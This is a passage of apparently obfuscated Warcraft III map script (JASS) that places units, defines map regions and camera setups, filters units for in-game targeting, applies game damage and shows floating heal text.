set Jz=CreateUnit(Ht,$68303456,-7399.1,-2781.3,227.06)
set J0=CreateUnit(Ht,$68303456,-8014.5,-11989.1,346.3)
set J1=CreateUnit(Ht,$68303456,-5685.2,-5606.,241.68)
set J2=CreateUnit(Ht,$68303456,-1647.3,1105.4,150.41)
set J3=CreateUnit(Ht,$68303456,-601.2,5549.8,181.6)
set J4=CreateUnit(Ht,$75303031,-12997.5,6266.2,312.58)
set J5=CreateUnit(Ht,$6E636B73,-11643.,592.,100.035)
call SetUnitState(J5,UNIT_STATE_MANA,0)
set J6=CreateUnit(Ht,$6E303738,23705.8,12123.4,291.26)
set J7=CreateUnit(Ht,$6E303739,1101.3,-11686.7,64.52)
set J8=CreateUnit(Ht,$6E303535,-15981.8,7225.3,35.39)
set J9=CreateUnit(Ht,$6F73686D,17572.,7250.7,329.63)
set KB=CreateUnit(Ht,$6E676832,-10132.7,11561.8,22.62)
set KC=CreateUnit(Ht,$68303632,5217.3,11305.9,45.)
set KD=CreateUnit(Ht,$68303632,6564.8,11284.4,135.)
set KE=CreateUnit(Ht,$68303632,6545.3,12584.9,225.)
set KF=CreateUnit(Ht,$68303632,5220.7,12564.,315.)
set Hc=null
set Hu=null
endfunction
function mq takes nothing returns nothing
call mg()
call mk()
endfunction
function mr takes nothing returns nothing
call mZ()
call ma()
call mb()
call mc()
call md()
call me()
call mf()
call mh()
call mi()
call mj()
call ml()
endfunction
function ms takes nothing returns nothing
call mm()
call mo()
call mq()
call mn()
call mp()
call mr()
endfunction
function mt takes nothing returns nothing
set H=Rect(-6080.,-4384.,-5952.,-4288.)
set I=Rect(-15712.,15168.,-15680.,15200.)
set J=Rect(2688.,-23552.,4480.,-21536.)
set K=Rect(-8064.,-1952.,-7936.,-1824.)
set L=Rect(-5824.,-224.,-5760.,-32.)
set M=Rect(-5184.,-3072.,-5024.,-2944.)
set N=Rect(-14336.,-3200.,-13824.,-2784.)
set O=Rect(-15872.,-5408.,-15648.,-5248.)
set P=Rect(-15712.,-5728.,-15616.,-5664.)
set Q=Rect(-16128.,-13664.,-15904.,-13504.)
set R=Rect(-15680.,-13600.,-15584.,-13536.)
set S=Rect(-7808.,2208.,-7616.,2368.)
set T=Rect(-13120.,-6976.,-12832.,-6688.)
set U=Rect(-9696.,-4928.,-9344.,-4576.)
set V=Rect(-9792.,-448.,-9568.,-224.)
set W=Rect(-5568.,-1600.,-5280.,-1344.)
set X=Rect(-8096.,2176.,-7840.,2432.)
set Y=Rect(-14272.,8320.,-14176.,8416.)
set Z=Rect(-6240.,-11328.,-6016.,-11040.)
set a=Rect(3072.,-23008.,4064.,-22048.)
set b=Rect(-4000.,-8960.,-3904.,-8864.)
set c=Rect(-10112.,-7744.,-9760.,-7424.)
set d=Rect(-15072.,-1664.,-14656.,-1280.)
set e=Rect(-1184.,-2496.,-960.,-2368.)
set f=Rect(-128.,-8896.,64.,-8768.)
set g=Rect(-6688.,-6432.,-6496.,-6240.)
set h=Rect(-2944.,-11328.,-1824.,-11072.)
set i=Rect(5952.,-24256.,6848.,-23008.)
set j=Rect(160.,-5312.,960.,-4640.)
set k=Rect(928.,-5312.,960.,-5280.)
set l=Rect(64.,-9408.,160.,-9312.)
set m=Rect(-3904.,-3808.,-3616.,-3552.)
set n=Rect(448.,3936.,864.,4224.)
set o=Rect(-4224.,0.,-3680.,416.)
set p=Rect(1152.,4096.,1536.,4448.)
set q=Rect(416.,3520.,512.,3648.)
set r=Rect(-14048.,8416.,-13984.,8480.)
set s=Rect(-13056.,7744.,-12992.,7808.)
set t=Rect(-12928.,7552.,-12864.,7616.)
set u=Rect(-4320.,8640.,-4256.,8704.)
set v=Rect(-4064.,8512.,-4000.,8576.)
set w=Rect(-4896.,7808.,-4832.,7840.)
set x=Rect(8064.,-24384.,9568.,-23072.)
set y=Rect(-9024.,8032.,-8896.,8160.)
set z=Rect(-15552.,992.,-14656.,2368.)
set BB=Rect(-13856.,1888.,-13632.,2112.)
set BC=Rect(128.,-5312.,192.,-5280.)
set BD=Rect(5696.,-24256.,7104.,-23008.)
set BE=Rect(-5632.,8992.,-5504.,9056.)
set BF=Rect(-11008.,-24224.,-10880.,-24096.)
set BG=Rect(-13280.,2528.,-13024.,2656.)
set BH=Rect(-13216.,2176.,-13088.,2368.)
set BI=Rect(-10688.,-4672.,-10464.,-4544.)
set BJ=Rect(2656.,-4256.,2816.,-4128.)
set BK=Rect(-5056.,4288.,-4928.,4416.)
set BL=Rect(-11936.,-8608.,-10400.,-7520.)
set BM=Rect(-8992.,-7520.,-8160.,-6848.)
set BN=Rect(-3488.,1568.,-2624.,1952.)
set BO=Rect(-10752.,-24096.,-10112.,-23456.)
set BP=Rect(-11840.,-7392.,-11712.,-7264.)
set BQ=Rect(-9216.,-7712.,-9088.,-7584.)
set BR=Rect(-2880.,1120.,-2784.,1216.)
set BS=Rect(8384.,-24128.,9280.,-23360.)
set BT=Rect(-5408.,12768.,-5184.,12992.)
set BU=Rect(-8960.,15584.,-8896.,15648.)
set BV=Rect(-8896.,14208.,-8832.,14272.)
set BW=Rect(-6400.,13600.,-6336.,13664.)
set BX=Rect(-6272.,12704.,-6176.,12800.)
set BY=Rect(-4416.,10976.,-4352.,11008.)
set BZ=Rect(-2496.,9920.,-2432.,9952.)
set Ba=Rect(960.,8640.,1024.,8672.)
set Bb=Rect(800.,10592.,864.,10624.)
set Bc=Rect(-416.,12352.,-384.,12416.)
set Bd=Rect(544.,15008.,608.,15072.)
set Be=Rect(2560.,14688.,2592.,14720.)
set Bf=Rect(-7616.,9824.,-7584.,9856.)
set Bg=Rect(-12256.,10240.,-12160.,10304.)
set Bh=Rect(-12448.,12640.,-12384.,12704.)
set Bi=Rect(-7616.,9824.,-7072.,10432.)
set Bj=Rect(-7264.,10240.,-7072.,10432.)
set Bk=Rect(224.,11904.,416.,12448.)
set Bl=Rect(-7584.,15168.,-7424.,15296.)
set Bm=Rect(-7840.,15136.,-7776.,15200.)
set Bn=Rect(-14272.,-5376.,-14144.,-5248.)
set Bo=Rect(-6016.,-14592.,-5792.,-14368.)
set Bp=Rect(544.,-4864.,672.,-4768.)
set Bq=Rect(-14400.,-5696.,-13792.,-4768.)
set Br=Rect(-13824.,-5728.,-13792.,-5696.)
set Bs=Rect(-13824.,-4928.,-13792.,-4864.)
set Bt=Rect(-6368.,-14784.,-5216.,-14016.)
set Bu=Rect(-5280.,-14048.,-5216.,-14016.)
set Bv=Rect(-6368.,-14048.,-6304.,-14016.)
set Bw=Rect(-16128.,-7136.,-15552.,-6752.)
set Bx=Rect(-9280.,-5664.,-9152.,-5536.)
set By=Rect(-13216.,-12512.,-13088.,-12384.)
set Bz=Rect(-13216.,-12256.,-13184.,-12224.)
set B0=Rect(-5632.,-11424.,-5312.,-11136.)
set B1=Rect(-12224.,-12864.,-12160.,-12800.)
set B2=Rect(-928.,1664.,-448.,2112.)
set B3=Rect(-13664.,-14528.,-13472.,-14336.)
set B4=Rect(-13600.,-14720.,-13568.,-14688.)
set B5=Rect(-10304.,-7584.,-10176.,-7456.)
set B6=Rect(-10304.,-7840.,-10240.,-7776.)
set B7=Rect(13248.,-24544.,14944.,-22848.)
set B8=Rect(8000.,-2208.,8128.,-2112.)
set B9=Rect(7808.,-2336.,7872.,-2272.)
set CB=Rect(7616.,-2272.,7968.,-1920.)
set CC=Rect(5408.,-1472.,5440.,-1440.)
set CD=Rect(5504.,-1600.,5760.,-1376.)
set CE=Rect(14624.,2144.,14688.,2208.)
set CF=Rect(15168.,-288.,15200.,-224.)
set CG=Rect(16160.,-1120.,16256.,-1056.)
set CH=Rect(14368.,-3008.,14464.,-2944.)
set CI=Rect(15520.,-5152.,15584.,-5088.)
set CJ=Rect(13952.,-6112.,14016.,-6080.)
set CK=Rect(12960.,-4544.,13024.,-4512.)
set CL=Rect(-10208.,7648.,-9824.,7968.)
set CM=Rect(7488.,4960.,8800.,6208.)
set CN=Rect(4864.,-7872.,7104.,-6464.)
set CO=Rect(5664.,992.,5888.,1344.)
set CP=Rect(11200.,5152.,11584.,5440.)
set CQ=Rect(10464.,-608.,10592.,-544.)
set CR=Rect(7648.,-608.,7712.,-544.)
set CS=Rect(10112.,224.,11520.,320.)
set CT=Rect(11296.,-1024.,11648.,192.)
set CU=Rect(10112.,-1216.,11392.,-1120.)
set CV=Rect(-12704.,-24288.,-12576.,-24192.)
set CW=Rect(5088.,192.,5216.,352.)
set CX=Rect(-10560.,12256.,-9056.,13568.)
set CY=Rect(384.,11552.,2112.,12512.)
set CZ=Rect(-14464.,2688.,-14048.,2752.)
set Ca=Rect(-8928.,-24000.,-8192.,-23456.)
set Cb=Rect(-9120.,-24096.,-9024.,-24000.)
set Cc=Rect(-7296.,-24288.,-7168.,-24160.)
set Cd=Rect(-7040.,-24224.,-6304.,-23616.)
set Ce=Rect(8768.,-23808.,8928.,-23680.)
set Cf=Rect(-15008.,-15328.,-14880.,-15168.)
set Cg=Rect(-16192.,-16288.,-16000.,-16128.)
set Ch=Rect(13856.,-24032.,14304.,-23552.)
set Ci=Rect(14784.,-5312.,14912.,-5216.)
set Cj=Rect(14688.,-5600.,14784.,-5536.)
set Ck=Rect(-11520.,5888.,-11360.,5952.)
set Cl=Rect(-6496.,5888.,-6368.,5984.)
set Cm=Rect(1664.,2880.,2080.,3264.)
set Cn=Rect(2688.,2080.,2880.,2304.)
set Co=Rect(3136.,1696.,3264.,2656.)
set Cp=Rect(4000.,2048.,4192.,2240.)
set Cq=Rect(-14144.,9600.,-14016.,9632.)
set Cr=Rect(-12032.,2944.,-11904.,3040.)
set Cs=Rect(-14848.,9312.,-13376.,10752.)
set Ct=Rect(-5248.,-24192.,-4576.,-23712.)
set Cu=Rect(-5536.,-24288.,-5440.,-24192.)
set Cv=Rect(-10336.,-21632.,-9408.,-20672.)
set Cw=Rect(-1760.,-1024.,-1536.,-736.)
set Cx=Rect(-9952.,-21536.,-9824.,-21472.)
set Cy=Rect(7232.,-1824.,7552.,-1536.)
set Cz=Rect(-7264.,-2368.,-6944.,-2048.)
set C0=Rect(-8128.,-2240.,-7776.,-1952.)
set C1=Rect(-11264.,-7104.,-10912.,-6816.)
set C2=Rect(-5344.,-10784.,-5088.,-10400.)
set C3=Rect(-11808.,-15008.,-11456.,-14656.)
set C4=Rect(-9248.,-6720.,-8864.,-6400.)
set C5=Rect(-3008.,-9024.,-2688.,-8704.)
set C6=Rect(1088.,-9216.,1632.,-8576.)
set C7=Rect(480.,-4928.,928.,-4576.)
set C8=Rect(-1568.,1376.,-1248.,1728.)
set C9=Rect(-1248.,2496.,-864.,2912.)
set DB=Rect(-2464.,5664.,-2048.,6112.)
set DC=Rect(3264.,7328.,3616.,7776.)
set DD=Rect(-224.,7488.,288.,7872.)
set DE=Rect(-6496.,6080.,-6016.,6560.)
set DF=Rect(-6752.,2784.,-6208.,3232.)
set DG=Rect(-5152.,9536.,-4736.,9888.)
set DH=Rect(-9472.,12832.,-9056.,13312.)
set DI=Rect(800.,8480.,1216.,8896.)
set DJ=Rect(6368.,160.,6816.,512.)
set DK=Rect(6112.,-24256.,6720.,-23200.)
set DL=Rect(-10720.,-22112.,-9024.,-20128.)
set DM=Rect(-14112.,-9440.,-13920.,-9312.)
set DN=Rect(-15264.,-24064.,-15072.,-24000.)
set DO=Rect(-12416.,-24224.,-11904.,-23808.)
set DP=Rect(-15840.,-24128.,-14496.,-22944.)
set DQ=Rect(-15264.,-23616.,-15040.,-23424.)
set DR=Rect(-13760.,14176.,-13664.,14240.)
set DS=Rect(-15744.,-192.,-15616.,-96.)
set DT=Rect(8192.,4960.,9536.,6272.)
set DU=Rect(-14720.,13984.,-12608.,16288.)
set DV=Rect(-13280.,-2592.,-13120.,-2368.)
set DW=Rect(-12960.,-21984.,-12096.,-20928.)
set DX=Rect(-12576.,-21856.,-12480.,-21824.)
set DY=Rect(-13088.,-20960.,-12928.,-20864.)
set DZ=Rect(-12096.,-20992.,-11936.,-20832.)
set Da=Rect(-13984.,-10304.,-13824.,-10144.)
set Db=Rect(-14240.,-10592.,-13472.,-9824.)
set Dc=Rect(-15360.,-10016.,-15072.,-9664.)
set Dd=Rect(-16224.,-10112.,-15904.,-9824.)
set De=Rect(-14784.,-10208.,-14528.,-9920.)
set Df=Rect(-16000.,-11264.,-15712.,-11008.)
set Dg=Rect(-16256.,-10752.,-15968.,-10464.)
set Dh=Rect(-9152.,-6720.,-8672.,-6272.)
set Di=Rect(10432.,-24544.,12640.,-22304.)
set Dj=Rect(10656.,-24192.,12320.,-22720.)
set Dk=Rect(-11360.,-2176.,-10976.,-1824.)
set Dl=Rect(1696.,5472.,1920.,5696.)
set Dm=Rect(23392.,10144.,23616.,10400.)
set Dn=Rect(19936.,15072.,20096.,15296.)
set Do=Rect(23680.,12960.,23936.,13056.)
set Dp=Rect(24128.,15072.,24320.,15232.)
set Dq=Rect(13408.,12800.,13504.,12832.)
set Dr=Rect(13408.,13024.,13504.,13088.)
set Ds=Rect(12800.,14496.,14144.,15456.)
set Dt=Rect(9568.,14624.,10880.,15296.)
set Du=Rect(10176.,13248.,10304.,13312.)
set Dv=Rect(10048.,12992.,10144.,13024.)
set Dw=Rect(7488.,14880.,8608.,15776.)
set Dx=Rect(7936.,13120.,8096.,13184.)
set Dy=Rect(8128.,12896.,8192.,12960.)
set Dz=Rect(-13760.,-11776.,-13440.,-11488.)
set D0=Rect(-5504.,9408.,-5120.,9760.)
set D1=Rect(-11616.,-16288.,-11200.,-15936.)
set D2=Rect(-2816.,14720.,-1856.,15744.)
set D3=Rect(-6304.,1056.,-5952.,1440.)
set D4=Rect(11104.,-8608.,11232.,-8512.)
set D5=Rect(10880.,-7904.,11040.,-7808.)
set D6=Rect(15648.,-24480.,16608.,-22752.)
set D7=Rect(-15584.,-21696.,-14784.,-20896.)
set D8=Rect(-16064.,-20896.,-15808.,-20704.)
set D9=Rect(-14592.,-20896.,-14368.,-20640.)
set EB=Rect(-16128.,-21984.,-15872.,-21760.)
set EC=Rect(-14528.,-21984.,-14272.,-21760.)
set ED=Rect(15616.,-22400.,16608.,-21504.)
set EE=Rect(9216.,-5568.,9408.,-5408.)
set EF=Rect(8896.,-6272.,9792.,-5312.)
set EG=Rect(-2272.,11488.,-1600.,12064.)
set EH=Rect(-4576.,11424.,-3520.,12480.)
set EI=Rect(5792.,7936.,5952.,8096.)
set EJ=Rect(6336.,7936.,6496.,8096.)
set EK=Rect(8704.,8896.,10240.,10368.)
set EL=Rect(9120.,-5728.,9536.,-5408.)
set EM=Rect(-11424.,-2304.,-11296.,-1600.)
set EN=Rect(-16320.,9216.,-15296.,10528.)
set EO=Rect(-16352.,11168.,-15136.,12608.)
set EP=Rect(2880.,11744.,3008.,11872.)
set EQ=Rect(2912.,12160.,3040.,12288.)
set ER=Rect(3328.,12352.,3456.,12480.)
set ES=Rect(3712.,12192.,3840.,12320.)
set ET=Rect(3776.,11712.,3904.,11840.)
set EU=Rect(3520.,11392.,3648.,11520.)
set EV=Rect(3104.,11392.,3232.,11520.)
set EW=Rect(-7872.,7872.,-7744.,8000.)
set EX=Rect(2240.,11840.,2336.,12096.)
set EY=Rect(11168.,-6592.,12800.,-5184.)
set EZ=Rect(2400.,10752.,4192.,13344.)
set Ea=Rect(13696.,4608.,13792.,4960.)
set Eb=Rect(15488.,-4736.,16000.,-4224.)
set Ec=Rect(14976.,-4448.,15840.,-3456.)
set Ed=Rect(-15968.,-19808.,-14880.,-18688.)
set Ee=Rect(-12640.,-15904.,-12352.,-15808.)
set Ef=Rect(-15488.,-19040.,-15360.,-18784.)
set Eg=Rect(4864.,-9024.,5120.,-8992.)
set Eh=Rect(4864.,-11008.,5120.,-10944.)
set Ei=Rect(5376.,-9088.,5632.,-8960.)
set Ej=Rect(5376.,-12256.,5632.,-12160.)
set Ek=Rect(6272.,-9056.,6528.,-8960.)
set El=Rect(6272.,-11200.,6528.,-11104.)
set Em=Rect(3712.,-11776.,3904.,-11520.)
set En=Rect(7008.,-11776.,7136.,-11520.)
set Eo=Rect(7008.,-10112.,7168.,-9856.)
set Ep=Rect(3840.,-10112.,4000.,-9856.)
set Eq=Rect(3808.,-9216.,4032.,-8960.)
set Er=Rect(6784.,-9312.,7072.,-9120.)
set Es=Rect(9600.,-2848.,10016.,-2432.)
set Et=Rect(3680.,-12384.,7200.,-8768.)
set Eu=Rect(-14720.,640.,-14560.,800.)
set Ev=Rect(4768.,13888.,4864.,13984.)
set Ew=Rect(5184.,-4672.,5280.,-4576.)
set Ex=Rect(-2880.,14624.,-2656.,14848.)
set Ey=Rect(3680.,9088.,4864.,10240.)
set Ez=Rect(8192.,-10400.,9152.,-10112.)
set E0=Rect(-15872.,-288.,-15520.,32.)
set E1=Rect(1664.,-10144.,1728.,-9472.)
set E2=Rect(3584.,-7936.,4000.,-7488.)
set E3=Rect(-352.,7808.,224.,8352.)
set E4=Rect(2720.,7744.,3392.,8320.)
set E5=Rect(4704.,6752.,5376.,7424.)
set E6=Rect(-800.,5376.,-480.,5760.)
set E7=Rect(-5888.,-5824.,-5504.,-5440.)
set E8=Rect(-8192.,-12192.,-7808.,-11808.)
set E9=Rect(-7584.,-3040.,-7200.,-2656.)
set FB=Rect(-13152.,5856.,-12576.,6560.)
set FC=Rect(-14176.,14048.,-13216.,15296.)
set FD=Rect(3200.,4896.,4224.,5824.)
set FE=Rect(6496.,3744.,7680.,4928.)
set FF=Rect(1824.,10656.,1920.,10784.)
set FG=Rect(8160.,6976.,9248.,8096.)
set FH=Rect(6176.,9088.,7296.,10240.)
set FI=Rect(-13152.,-22208.,-11840.,-20640.)
set FJ=Rect(-16160.,-22176.,-14240.,-20576.)
set FK=Rect(-16000.,-24320.,-14336.,-22816.)
set FL=Rect(10400.,6336.,11872.,8224.)
set FM=Rect(-15744.,-12160.,-15648.,-12096.)
set FN=Rect(-15456.,-12160.,-15360.,-12096.)
set FO=Rect(-15456.,-12480.,-15360.,-12416.)
set FP=Rect(-15040.,-12352.,-14944.,-12256.)
set FQ=Rect(10528.,7968.,11552.,8032.)
set FR=Rect(23552.,11744.,23968.,12256.)
set FS=Rect(23904.,11808.,24064.,11968.)
set FT=Rect(-14304.,14016.,-13120.,15392.)
set FU=Rect(6880.,7936.,7008.,8096.)
set FV=Rect(-2112.,928.,-1568.,1376.)
set FW=Rect(4960.,11104.,6816.,12928.)
set FX=Rect(7456.,11200.,8544.,12256.)
set FY=Rect(-3392.,-24096.,-3264.,-24000.)
set FZ=Rect(-3520.,-24416.,-2240.,-23264.)
set Fa=Rect(-1440.,-24160.,-1312.,-24064.)
set Fb=Rect(-928.,-23808.,-832.,-23744.)
set Fc=Rect(-3360.,-23456.,-3264.,-23360.)
set Fd=Rect(-1536.,-24320.,-96.,-23136.)
set Fe=Rect(-11456.,3200.,-10048.,4864.)
set Ff=Rect(-11520.,-704.,-11264.,-512.)
set Fg=Rect(-5088.,7616.,-5024.,7680.)
set Fh=Rect(-12544.,9024.,-12160.,9376.)
set Fi=Rect(-1888.,-14368.,-1440.,-13888.)
set Fj=Rect(-3680.,-12320.,-3168.,-12000.)
set Fk=Rect(-672.,-14656.,416.,-13536.)
set Fl=Rect(-1568.,-14400.,-1344.,-13856.)
set Fm=Rect(14400.,1760.,16288.,3584.)
set Fn=Rect(-864.,-14976.,704.,-13216.)
set Fo=Rect(288.,-14240.,480.,-14016.)
set Fp=Rect(-16096.,7104.,-15616.,7552.)
set Fq=Rect(3712.,9568.,3808.,9760.)
set Fr=Rect(4768.,9568.,4864.,9760.)
set Fs=Rect(16128.,32.,16224.,128.)
set Ft=Rect(-9248.,-3936.,-9120.,-3872.)
set Fu=Rect(-10368.,928.,-9952.,1984.)
set Fv=Rect(-10272.,11392.,-9792.,11776.)
set Fw=Rect(11296.,9344.,11424.,9568.)
set Fx=Rect(11712.,9344.,12320.,9600.)
set Fy=Rect(11616.,10560.,12352.,10816.)
set Fz=Rect(11264.,10592.,11392.,10816.)
set F0=Rect(15808.,-24192.,16416.,-23104.)
set F1=Rect(-4832.,5728.,-4704.,5856.)
set F2=Rect(1856.,12928.,2080.,13024.)
set F3=Rect(-2720.,-8960.,-2624.,-8832.)
set F4=Rect(4192.,3520.,4384.,3584.)
set F5=Rect(-992.,15264.,192.,15968.)
set F6=Rect(-6624.,9408.,-5792.,10272.)
set F7=Rect(23040.,10176.,23232.,10368.)
set F8=Rect(1056.,15264.,1472.,15712.)
set F9=Rect(22592.,5120.,22976.,5504.)
set GB=Rect(23616.,6688.,24096.,7072.)
set GC=Rect(19808.,7488.,20128.,7840.)
set GD=Rect(17536.,6560.,17824.,6880.)
set GE=Rect(19168.,4768.,19584.,5152.)
set GF=Rect(12928.,-6624.,13152.,-6528.)
set GG=Rect(-11872.,640.,-11680.,832.)
set GH=Rect(4384.,-2816.,4608.,-2496.)
set GI=Rect(-1536.,-12736.,160.,-11424.)
set GJ=Rect(17984.,-24320.,19104.,-21920.)
set GK=Rect(10240.,5376.,10336.,5472.)
set GL=Rect(12800.,2400.,14272.,4064.)
set GM=Rect(4992.,4160.,5120.,4224.)
set GN=Rect(14880.,6208.,15136.,6240.)
set GO=Rect(17920.,1696.,18944.,2304.)
set GP=Rect(-15936.,-8416.,-15840.,-8352.)
set GQ=Rect(13536.,4576.,13696.,4960.)
set GR=Rect(-16000.,1888.,-15136.,2656.)
set GS=Rect(23520.,4800.,23840.,5152.)
set GT=Rect(19168.,1440.,19360.,1568.)
set GU=Rect(6688.,4352.,7296.,4672.)
set GV=Rect(17888.,1184.,19552.,2784.)
set GW=Rect(20608.,1792.,22272.,3456.)
set GX=Rect(20128.,1248.,22784.,3840.)
set GY=Rect(17632.,7264.,17792.,7456.)
set GZ=Rect(-864.,-6624.,-736.,-6464.)
set Ga=Rect(3296.,11904.,3392.,12000.)
set Gb=Rect(832.,-24128.,1888.,-23296.)
set Gc=Rect(800.,-24160.,1952.,-23136.)
set Gd=Rect(640.,-24384.,2048.,-22976.)
set Ge=Rect(4544.,-24448.,4832.,-24160.)
set Gf=Rect(8736.,-24256.,8864.,-24128.)
set Gg=Rect(-15744.,-12480.,-15648.,-12416.)
set Gh=Rect(-14112.,1024.,-13312.,1664.)
set Gi=Rect(3584.,-4896.,4320.,-4256.)
set Gj=Rect(5856.,-864.,6432.,-288.)
set Gk=Rect(-4224.,11712.,-3808.,12160.)
set Gl=Rect(-4416.,-12352.,-4224.,-12032.)
set Gm=Rect(-12768.,-2944.,-12448.,-2720.)
set Gn=Rect(1536.,-4768.,1856.,-4416.)
set Go=Rect(22816.,480.,24416.,3904.)
set Gp=Rect(-7424.,1280.,-5984.,2400.)
set Gq=Rect(-14560.,-4416.,-14272.,-4256.)
set Gr=Rect(21280.,10592.,21504.,10784.)
set Gs=Rect(16032.,-24288.,16160.,-24224.)
set Gt=Rect(2560.,1312.,4288.,2784.)
set Gu=Rect(-6080.,14624.,-4288.,16032.)
set Gv=Rect(-2880.,14048.,-1920.,14112.)
set Gw=Rect(15744.,-5536.,16096.,-5088.)
set Gx=Rect(-8352.,-22688.,-7136.,-21248.)
set Gy=Rect(-7808.,-22496.,-7744.,-22464.)
set Gz=Rect(-6272.,-22432.,-5056.,-20800.)
set G0=Rect(-10816.,3360.,-10496.,3424.)
set G1=Rect(21184.,-160.,22592.,1152.)
endfunction
function mu takes nothing returns nothing
set G2=CreateCameraSetup()
call CameraSetupSetField(G2,CAMERA_FIELD_ZOFFSET,0.,0.)
call CameraSetupSetField(G2,CAMERA_FIELD_ROTATION,322.,0.)
call CameraSetupSetField(G2,CAMERA_FIELD_ANGLE_OF_ATTACK,320.,0.)
call CameraSetupSetField(G2,CAMERA_FIELD_TARGET_DISTANCE,933.,0.)
call CameraSetupSetField(G2,CAMERA_FIELD_ROLL,0.,0.)
call CameraSetupSetField(G2,CAMERA_FIELD_FIELD_OF_VIEW,70.,0.)
call CameraSetupSetField(G2,CAMERA_FIELD_FARZ,4989.,0.)
call CameraSetupSetDestPosition(G2,-10604.4,-1483.9,0.)
set G3=CreateCameraSetup()
call CameraSetupSetField(G3,CAMERA_FIELD_ZOFFSET,14.,0.)
call CameraSetupSetField(G3,CAMERA_FIELD_ROTATION,87.6,0.)
call CameraSetupSetField(G3,CAMERA_FIELD_ANGLE_OF_ATTACK,336.6,0.)
call CameraSetupSetField(G3,CAMERA_FIELD_TARGET_DISTANCE,930.6,0.)
call CameraSetupSetField(G3,CAMERA_FIELD_ROLL,355.,0.)
call CameraSetupSetField(G3,CAMERA_FIELD_FIELD_OF_VIEW,71.,0.)
call CameraSetupSetField(G3,CAMERA_FIELD_FARZ,5000.,0.)
call CameraSetupSetDestPosition(G3,1613.5,5142.5,0.)
set G4=CreateCameraSetup()
call CameraSetupSetField(G4,CAMERA_FIELD_ZOFFSET,0.,0.)
call CameraSetupSetField(G4,CAMERA_FIELD_ROTATION,128.3,0.)
call CameraSetupSetField(G4,CAMERA_FIELD_ANGLE_OF_ATTACK,340.6,0.)
call CameraSetupSetField(G4,CAMERA_FIELD_TARGET_DISTANCE,1006.,0.)
call CameraSetupSetField(G4,CAMERA_FIELD_ROLL,0.,0.)
call CameraSetupSetField(G4,CAMERA_FIELD_FIELD_OF_VIEW,70.,0.)
call CameraSetupSetField(G4,CAMERA_FIELD_FARZ,5000.,0.)
call CameraSetupSetDestPosition(G4,5303.4,911.9,0.)
set G5=CreateCameraSetup()
call CameraSetupSetField(G5,CAMERA_FIELD_ZOFFSET,0.,0.)
call CameraSetupSetField(G5,CAMERA_FIELD_ROTATION,110.2,0.)
call CameraSetupSetField(G5,CAMERA_FIELD_ANGLE_OF_ATTACK,344.2,0.)
call CameraSetupSetField(G5,CAMERA_FIELD_TARGET_DISTANCE,1296.5,0.)
call CameraSetupSetField(G5,CAMERA_FIELD_ROLL,0.,0.)
call CameraSetupSetField(G5,CAMERA_FIELD_FIELD_OF_VIEW,70.,0.)
call CameraSetupSetField(G5,CAMERA_FIELD_FARZ,5000.,0.)
call CameraSetupSetDestPosition(G5,9327.2,-5481.9,0.)
set G6=CreateCameraSetup()
call CameraSetupSetField(G6,CAMERA_FIELD_ZOFFSET,0.,0.)
call CameraSetupSetField(G6,CAMERA_FIELD_ROTATION,269.5,0.)
call CameraSetupSetField(G6,CAMERA_FIELD_ANGLE_OF_ATTACK,340.5,0.)
call CameraSetupSetField(G6,CAMERA_FIELD_TARGET_DISTANCE,716.,0.)
call CameraSetupSetField(G6,CAMERA_FIELD_ROLL,0.,0.)
call CameraSetupSetField(G6,CAMERA_FIELD_FIELD_OF_VIEW,70.,0.)
call CameraSetupSetField(G6,CAMERA_FIELD_FARZ,10000.,0.)
call CameraSetupSetDestPosition(G6,10296.8,-24309.8,0.)
set G7=CreateCameraSetup()
call CameraSetupSetField(G7,CAMERA_FIELD_ZOFFSET,0.,0.)
call CameraSetupSetField(G7,CAMERA_FIELD_ROTATION,347.6,0.)
call CameraSetupSetField(G7,CAMERA_FIELD_ANGLE_OF_ATTACK,308.1,0.)
call CameraSetupSetField(G7,CAMERA_FIELD_TARGET_DISTANCE,1650.,0.)
call CameraSetupSetField(G7,CAMERA_FIELD_ROLL,0.,0.)
call CameraSetupSetField(G7,CAMERA_FIELD_FIELD_OF_VIEW,70.,0.)
call CameraSetupSetField(G7,CAMERA_FIELD_FARZ,5000.,0.)
call CameraSetupSetDestPosition(G7,-11063.3,-1316.2,0.)
endfunction
function mv takes nothing returns boolean
if IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true then
if IsUnitIllusion(GetFilterUnit())==false then
if UnitAlive(GetFilterUnit()) then
return true
endif
endif
endif
return false
endfunction
function mw takes nothing returns boolean
if IsUnitEnemy(GetFilterUnit(),Player(0))==false then
if IsUnitIllusion(GetFilterUnit())==false then
if UnitAlive(GetFilterUnit()) then
return true
endif
endif
endif
return false
endfunction
function mx takes nothing returns boolean
if IsUnitEnemy(GetFilterUnit(),Player(0))==true then
if UnitAlive(GetFilterUnit()) then
return true
endif
endif
return false
endfunction
function my takes nothing returns boolean
if IsUnitEnemy(GetFilterUnit(),Player(11))==true then
if UnitAlive(GetFilterUnit()) then
if IsUnitType(GetTriggerUnit(),UNIT_TYPE_MAGIC_IMMUNE)==false then
return true
endif
endif
endif
return false
endfunction
function mz takes unit Ne,unit Hu,integer L9 returns nothing
call UnitDamageTarget(Ne,Hu,L9,true,false,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
endfunction
function m0 takes unit Ne,unit Hu,integer L9 returns nothing
call UnitDamageTarget(Ne,Hu,L9,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
endfunction
function m1 takes unit Ne,unit Hu,integer L9 returns nothing
call UnitDamageTarget(Ne,Hu,L9,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
endfunction
function m2 takes unit Ne,integer L9 returns nothing
local integer NT=R2I(GetUnitState(Ne,UNIT_STATE_MAX_LIFE)-GetUnitState(Ne,UNIT_STATE_LIFE))
local string Mc
local texttag No
if NT>0 then
set No=CreateTextTag()
if NT>L9 then
set Mc="+"+I2S(R2I(L9))
else
set Mc="+"+I2S(R2I(NT))
endif
call SetTextTagText(No,Mc,.021)
call SetTextTagPosUnit(No,Ne,0)
call SetTextTagColor(No,0,255,0,255)
call SetTextTagVelocity(No,0,.03)
if GetUnitTypeId(Ne)==$68303052 then
call SetTextTagVisibility(No,true)
else
if GetUnitAbilityLevel(Ne,$41313059)>=1 then
call SetTextTagVisibility(No,GetLocalPlayer()==GetOwningPlayer(Ne))
else
call SetTextTagVisibility(No,false)
endif
endif
call SetTextTagFadepoint(No,1)
call SetTextTagLifespan(No,2)
